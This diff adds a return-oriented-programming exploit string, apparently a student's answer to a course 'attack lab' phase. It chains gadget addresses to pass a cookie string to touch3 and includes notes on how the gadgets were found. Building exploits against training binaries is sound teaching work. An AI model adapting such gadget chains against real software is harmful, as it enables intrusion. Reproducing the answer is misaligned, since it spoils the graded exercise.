@@ -1,0 +1,45 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* offset */
+07 1a 40 00 00 00 00 00 /* 48 89 e0 : 0x401a03+0x4 = 0x401a07 : movq %rsp, %rax */
+ca 19 40 00 00 00 00 00 /* 89 c1 90 : 0x4019c9+0x1 = 0x4019ca : movl %eax, %ecx */
+27 1a 40 00 00 00 00 00 /* 89 ca    : 0x401a25+0x2 = 0x401a27 : movl %ecx, %edx */
+b7 19 40 00 00 00 00 00 /* 89 d6    : 0x4019b5+0x2 = 0x4019b7 : movl %edx, %esi */
+42 19 40 00 00 00 00 00 /* 58 c3    : 0x401940+0x2 = 0x401942 : pop %rax */
+41 00 00 00 00 00 00 00 /* offset from rsp to the string */
+34 19 40 00 00 00 00 00 /* 48 89 c7 : 0x401932+0x2 = 0x401934 : movq %rax, %rdi */
+60 17 40 00 00 00 00 00 /* 48 8d 04 37 c3 :        = 0x401960 : lea(%rdi,%rsi,1), %rax */
+34 19 40 00 00 00 00 00 /* 48 89 c7 : 0x401932+0x2 = 0x401934 : movq %rax, %rdi */
+96 18 40 00 00 00 00 00 /* touch3 address reverse (0x0000000000401896) */
+33 30 63 64 31 65 65 34 /* cookie (0x30cd1ee4) text to hex numbers */
+
+/*
+
+Research:
+
+48 89 e0 : 0x401a03+0x4 = 0x401a07 : movq %rsp, %rax
+89 c1 90 : 0x4019c9+0x1 = 0x4019ca : movl %eax, %ecx
+89 ca    : 0x401a25+0x2 = 0x401a27 : movl %ecx, %edx
+89 d6    : 0x4019b5+0x2 = 0x4019b7 : movl %edx, %esi
+58 c3    : 0x401940+0x2 = 0x401942 : pop %rax
+41 00 00 00 00 00 00 00            : offset from rsp to the string
+48 89 c7 : 0x401932+0x2 = 0x401934 : movq %rax, %rdi
+48 8d 04 37 c3 :        = 0x401960 : lea(%rdi,%rsi,1), %rax
+48 89 c7 : 0x401932+0x2 = 0x401934 : movq %rax, %rdi
+96 18 40 00 00 00 00 00            : touch3 address reverse (0x0000000000401896)
+33 30 63 64 31 65 65 34            : cookie (0x30cd1ee4) text to hex numbers
+
+
+Avalaible moves: 89 .{2} [ |90|c3]
+
+48 89 e0 : movq %rsp, %rax
+89 c1    : movl %eax, %ecx
+48 89 c7 : 0x401932+0x2 = 0x401934 : movq %rax, %rdi
+89 d6    : 0x4019b5+0x2 = 0x4019b7 : movl %edx, %esi
+89 ca    : 0x401a25+0x2 = 0x401a27 : movl %ecx, %edx
+
+*/
